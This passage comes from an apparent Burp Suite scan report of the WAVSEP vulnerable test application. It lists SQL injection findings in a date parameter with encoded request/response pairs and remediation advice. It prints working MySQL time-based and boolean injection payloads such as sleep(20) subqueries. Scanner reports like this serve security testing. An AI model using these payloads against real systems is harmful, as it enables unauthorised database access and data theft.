base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6258192953045527552</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>10868782 or 6502=06502</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NToyNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAxLTAxJiMzOTsmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClNldmVyYWwgYWNjb3VudHMgbWF0Y2ggdGhlIGNyaXRlcmlhLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxMTA4Njg3ODIlMjBvciUyMDY1MDIlM2QwNjUwMiBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDc5Nw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo0NyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICYjMzk7MjAxMC0wMS0wMTEwODY4NzgyIG9yIDY1MDI9MDY1MDImIzM5OzwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4054452230953929728</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the transactionDate parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" 